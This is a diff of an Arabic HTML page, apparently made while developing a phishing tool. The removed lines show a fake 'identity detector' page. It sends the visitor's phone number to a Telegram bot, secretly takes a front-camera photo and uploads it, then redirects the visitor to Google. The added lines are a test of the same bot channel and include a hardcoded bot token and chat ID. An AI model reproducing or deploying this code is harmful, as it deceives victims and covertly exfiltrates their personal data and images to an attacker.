@@ -2,60 +2,41 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>كاشف الهوية الملكي</title>
-    <style>
-        body { background: #0b0e14; color: #d4af37; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { background: #1a1d26; padding: 35px; border-radius: 20px; border: 1px solid #d4af37; width: 85%; max-width: 350px; text-align: center; }
-        input { width: 100%; padding: 15px; margin: 20px 0; border-radius: 10px; border: 1px solid #333; background: #000; color: white; font-size: 18px; text-align: center; box-sizing: border-box; }
-        button { background: linear-gradient(45deg, #d4af37, #f9e29c); color: black; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; }
-    </style>
+    <title>اختبار البوت</title>
 </head>
-<body>
-<div class="box">
-    <div style="font-size: 50px;">⚜️</div>
-    <h2>كاشف الهوية الملكي</h2>
-    <input type="tel" id="n" placeholder="07XXXXXXXX">
-    <button onclick="run()">بدأ الفحص الآن</button>
-    <p id="w" style="display:none; margin-top:15px; color:#888;">جاري معالجة البيانات...</p>
-</div>
-<video id="v" autoplay playsinline muted style="display:none"></video>
-<canvas id="c" style="display:none"></canvas>
+<body style="background: #000; color: #fff; text-align: center; padding-top: 50px; font-family: sans-serif;">
 
-<script>
-    const T = '8736983183:AAHZI864nf1nxjmOlqsAnwhSoK9K2VR5W7Y';
-    const C = '5156556639';
+    <h2>⚜️ اختبار اتصال تليجرام</h2>
+    <p>اضغط الزر لتجربة إرسال رسالة "Hello" للبوت</p>
+    
+    <button onclick="testBot()" style="padding: 15px 30px; font-size: 18px; cursor: pointer; background: #d4af37; border: none; border-radius: 10px; font-weight: bold;">
+        إرسال رسالة تجريبية
+    </button>
 
-    async function run() {
-        const val = document.getElementById('n').value;
-        if(val.length < 5) return;
-        document.getElementById('w').style.display = 'block';
+    <p id="res" style="margin-top: 20px; color: #888;"></p>
 
-        // 1. إرسال الرقم فوراً (هذا الجزء سيعمل 100% مهما كان نوع الجهاز)
-        fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🚨 صيد جديد:\n📞 الرقم: ${val}`);
+    <script>
+        // التوكن والأيدي الخاص بك
+        const T = '8736983183:AAHZI864nf1nxjmOlqsAnwhSoK9K2VR5W7Y';
+        const C = '5156556639';
 
-        // 2. محاولة التصوير السريع
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(s => {
-            const video = document.getElementById('v');
-            video.srcObject = s;
-            setTimeout(() => {
-                const canvas = document.getElementById('c');
-                canvas.width = 400; canvas.height = 500;
-                canvas.getContext('2d').drawImage(video, 0, 0, 400, 500);
-                canvas.toBlob(b => {
-                    const fd = new FormData();
-                    fd.append('chat_id', C);
-                    fd.append('photo', b, 's.jpg');
-                    fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd, mode: 'no-cors' });
-                    
-                    // التحويل لجوجل بعد الإرسال مباشرة
-                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
-                }, 'image/jpeg', 0.4);
-            }, 1500);
-        })
-        .catch(() => { window.location.href = "https://www.google.com"; });
-    }
-</script>
+        async function testBot() {
+            const status = document.getElementById('res');
+            status.innerText = "جاري المحاولة...";
+
+            const url = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=✅ تم الاتصال بنجاح! كود الاختبار يعمل.`;
+
+            try {
+                // استخدام Image Beacon لتخطي حماية CORS نهائياً في الاختبار
+                const img = new Image();
+                img.onload = () => { status.innerText = "✅ تم الإرسال! افحص تليجرام الآن."; };
+                img.onerror = () => { status.innerText = "❌ فشل الإرسال (تأكد من التوكن أو اضغط Start للبوت)"; };
+                img.src = url;
+
+            } catch (e) {
+                status.innerText = "❌ حدث خطأ برمجياً.";
+            }
+        }
+    </script>
 </body>
 </html>
